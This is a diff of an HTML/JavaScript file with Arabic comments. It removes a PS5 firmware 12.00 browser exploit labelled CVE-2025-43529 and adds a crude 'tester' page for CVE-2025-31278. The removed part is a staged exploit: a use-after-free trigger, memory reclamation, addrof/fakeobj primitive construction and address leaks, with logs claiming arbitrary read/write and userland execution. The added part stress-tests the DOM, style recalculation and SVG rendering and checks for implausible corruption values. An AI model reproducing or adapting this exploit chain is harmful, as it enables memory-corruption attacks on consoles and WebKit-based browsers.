@@ -1,192 +1,170 @@
-// ===== الملف الأساسي: ps5-exploit.html =====
-
+<!DOCTYPE html>
 <html>
 <head>
-    <title>PS5 12.00 Exploit</title>
+    <title>CVE-2025-31278 PS5 Tester</title>
 </head>
 <body>
+<h1>Testing CVE-2025-31278 Pattern on PS5</h1>
+
 <script>
+// ===== المرحلة 1: Baseline UAF Test =====
 
-// ===== المرحلة 1: Trigger CVE-2025-43529 =====
-
-const uafArray = new Array(0x400000).fill(1.1);
-let uafReclaimed = [];
-let exploitState = {
-    stage1Complete: false,
-    addrof: null,
-    fakeobj: null
-};
-
-function triggerUAF(flag, k, allocCount) {
-    // نفس كود iOS تماماً!
-    let A = {
-        p0: 0x41414141,
-        p1: 1.1,
-        p2: 2.2,
-    };
-    uafArray[uafArray.length - 1] = A;
-
-    let forGC = [];
-    let a = new Date(1111);
-    a[0] = 1.1;  // Create butterfly
-
-    for (let j = 0; j < allocCount; ++j) {
-        forGC.push(new ArrayBuffer(0x800000));
-    }
-
-    A.p2 = forGC;
+function testDOMCorruption() {
+    console.log("[*] Starting DOM Corruption Test");
     
-    let b = { p0: 0x42424242, p1: 1.1 };
-
-    let f;
-    f = b;
-    if (flag) { f = 1.1; }
-
-    A.p1 = f;  // Phi escape - BUG TRIGGER!
-
-    // Long loop for race window
-    let v = 1.1;
-    for (let i = 0; i < 1e6; ++i) {
-        for (let j = 0; j < k; ++j) {
-            v = i;
-            v = j;
+    // نمط 1: Rapid DOM mutation during layout
+    let root = document.createElement('div');
+    root.id = 'root';
+    document.body.appendChild(root);
+    
+    // Allocate many DOM nodes
+    for (let i = 0; i < 1000; i++) {
+        let elem = document.createElement('span');
+        elem.textContent = "X".repeat(100);
+        elem.style.display = 'inline-block';
+        root.appendChild(elem);
+    }
+    
+    // Force initial layout
+    let h1 = root.offsetHeight;
+    console.log("[*] Initial height:", h1);
+    
+    // Pattern: rapid mutation + layout requests
+    for (let j = 0; j < 100; j++) {
+        // Add/Remove during layout
+        if (j % 2 === 0) {
+            root.removeChild(root.firstChild);
+        } else {
+            let elem = document.createElement('span');
+            elem.textContent = "Y".repeat(50);
+            root.appendChild(elem);
+        }
+        
+        // Force layout = trigger rendering path
+        let h = root.offsetHeight;
+        
+        if (h === 0xDEADBEEF || h === -1 || isNaN(h)) {
+            console.log("🔴 POSSIBLE CORRUPTION DETECTED: height =", h);
+            return true;  // ✅ Found it!
         }
     }
-
-    b.p0 = v;
-    b.p1 = a;  // ❌ NO WRITE BARRIER - UAF!
+    
+    return false;
 }
 
-function recursive(n) {
-    if (n === 0) return;
-    n = n | 0;
-    recursive(n - 1);
+// ===== المرحلة 2: Style Recalculation UAF =====
+
+function testStyleRecalcUAF() {
+    console.log("[*] Starting Style Recalc UAF Test");
+    
+    let container = document.createElement('div');
+    document.body.appendChild(container);
+    
+    // Create element with complex styles
+    let elem = document.createElement('div');
+    elem.style.cssText = `
+        width: 100px;
+        height: 100px;
+        background: red;
+        position: relative;
+        left: 0px;
+        top: 0px;
+    `;
+    container.appendChild(elem);
+    
+    // Trigger style recalculation
+    let style1 = window.getComputedStyle(elem);
+    console.log("[*] Initial width:", style1.width);
+    
+    // Pattern: remove while accessing computed style
+    setTimeout(() => {
+        elem.style.width = "200px";
+        let style2 = window.getComputedStyle(elem);  // ← Could UAF here
+        
+        if (style2.width === "" || style2.width === "NaN" || !style2) {
+            console.log("🔴 POSSIBLE UAF IN STYLE: width =", style2.width);
+            return true;
+        }
+    }, 10);
+    
+    return false;
 }
 
-function reclaimMemory() {
-    for (let k = 0; k < 10000; ++k) {
-        triggerUAF(false, 10, k % 5 + 1);
-        recursive(10000);
+// ===== المرحلة 3: Rendering Path Corruption =====
 
-        for (let i = 0; i < 16; ++i) {
-            let arr = [13.37, 2.2, 3.3, 4.4];
-            uafReclaimed.push(arr);
-            
-            // Check if we reclaimed the butterfly
-            if (uafArray[uafArray.length - 1].p1.p1[0] === 13.37) {
-                exploitState.stage1Complete = true;
-                return uafReclaimed[uafReclaimed.length - 1];
-            }
+function testRenderingPathOOB() {
+    console.log("[*] Starting Rendering Path OOB Test");
+    
+    // Large SVG or complex layout
+    let svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+    svg.setAttribute('width', '1000');
+    svg.setAttribute('height', '1000');
+    document.body.appendChild(svg);
+    
+    // Add many elements
+    for (let i = 0; i < 500; i++) {
+        let rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+        rect.setAttribute('x', i * 2);
+        rect.setAttribute('y', i * 2);
+        rect.setAttribute('width', '10');
+        rect.setAttribute('height', '10');
+        svg.appendChild(rect);
+    }
+    
+    // Force render
+    let bbox = svg.getBBox ? svg.getBBox() : null;
+    console.log("[*] SVG BBox:", bbox);
+    
+    // Rapid manipulation
+    for (let i = 0; i < 50; i++) {
+        svg.style.transform = `rotate(${i}deg)`;
+        let newBbox = svg.getBBox ? svg.getBBox() : null;
+        
+        if (!newBbox || newBbox.x === undefined) {
+            console.log("🔴 POSSIBLE RENDERING CORRUPTION");
+            return true;
         }
     }
-    return null;
-}
-
-// ===== المرحلة 2: Build Primitives =====
-
-function buildPrimitives() {
-    if (!exploitState.stage1Complete) {
-        console.log('Stage 1 failed');
-        return false;
-    }
-
-    let boxed_arr = uafReclaimed[uafReclaimed.length - 1];
-    boxed_arr[0] = {};
-    let unboxed_arr = uafArray[uafArray.length - 1].p1.p1;
-
-    let ab = new ArrayBuffer(8);
-    let u64 = new BigUint64Array(ab);
-    let f64 = new Float64Array(ab);
-
-    function itof(value) {
-        u64[0] = value;
-        return f64[0];
-    }
-
-    function ftoi(f) {
-        f64[0] = f;
-        return u64[0];
-    }
-
-    // ✅ Build primitives
-    exploitState.addrof = function(obj) {
-        boxed_arr[0] = obj;
-        return ftoi(unboxed_arr[0]);
-    };
-
-    exploitState.fakeobj = function(addr) {
-        unboxed_arr[0] = itof(addr);
-        return boxed_arr[0];
-    };
-
-    return true;
-}
-
-// ===== المرحلة 3: Leak System Information =====
-
-function leakSystemInfo() {
-    if (!exploitState.addrof) return false;
-
-    const addrof = exploitState.addrof;
-
-    // Leak process information
-    let arrayBuffer = new ArrayBuffer(0x1000);
-    let arrayBufferAddr = addrof(arrayBuffer);
-    console.log('[*] ArrayBuffer Address: 0x' + arrayBufferAddr.toString(16));
-
-    // Leak function objects (potential for ROP)
-    let testFunc = function() { return 42; };
-    let funcAddr = addrof(testFunc);
-    console.log('[*] Function Address: 0x' + funcAddr.toString(16));
-
-    // Leak typed arrays
-    let float64Array = new Float64Array(16);
-    let f64Addr = addrof(float64Array);
-    console.log('[*] Float64Array Address: 0x' + f64Addr.toString(16));
-
-    return {
-        arrayBufferAddr,
-        funcAddr,
-        f64Addr
-    };
-}
-
-// ===== Main Exploit Flow =====
-
-function main() {
-    console.log('[+] PS5 12.00 Exploit - CVE-2025-43529');
-    console.log('[*] Stage 1: Trigger UAF...');
     
-    reclaimMemory();
-
-    if (!exploitState.stage1Complete) {
-        console.log('[-] Stage 1 Failed');
-        return;
-    }
-    console.log('[+] Stage 1 Complete!');
-
-    console.log('[*] Stage 2: Build Primitives...');
-    if (!buildPrimitives()) {
-        console.log('[-] Stage 2 Failed');
-        return;
-    }
-    console.log('[+] Stage 2 Complete!');
-
-    console.log('[*] Stage 3: Leak System Info...');
-    const leaks = leakSystemInfo();
-    if (!leaks) {
-        console.log('[-] Stage 3 Failed');
-        return;
-    }
-    console.log('[+] Stage 3 Complete!');
-
-    console.log('[+] Got arbitrary read/write primitives!');
-    console.log('[+] ✅ Userland execution possible');
-    console.log('[⚠️] ❌ Kernel exploitation NOT YET PUBLIC on FW 12.00');
+    return false;
 }
 
-// Run exploit
-main();
+// ===== Main Execution =====
+
+console.log("========================================");
+console.log("CVE-2025-31278 Test Suite for PS5");
+console.log("========================================");
+
+let results = [];
+
+results.push({
+    test: "DOM Corruption",
+    result: testDOMCorruption()
+});
+
+results.push({
+    test: "Style Recalc UAF",
+    result: testStyleRecalcUAF()
+});
+
+results.push({
+    test: "Rendering Path OOB",
+    result: testRenderingPathOOB()
+});
+
+console.log("\n========== RESULTS ==========");
+results.forEach(r => {
+    console.log(`${r.test}: ${r.result ? '🔴 VULNERABLE' : '✅ NO CRASH'}`);
+});
+
+// If any test triggered corruption, we might have a lead
+let vulnerable = results.some(r => r.result);
+if (vulnerable) {
+    console.log("\n⚠️ POTENTIAL VULNERABILITY FOUND!");
+    console.log("This pattern might work for exploitation");
+} else {
+    console.log("\n✅ No crash detected with these patterns");
+}
 
 </script>
 </body>
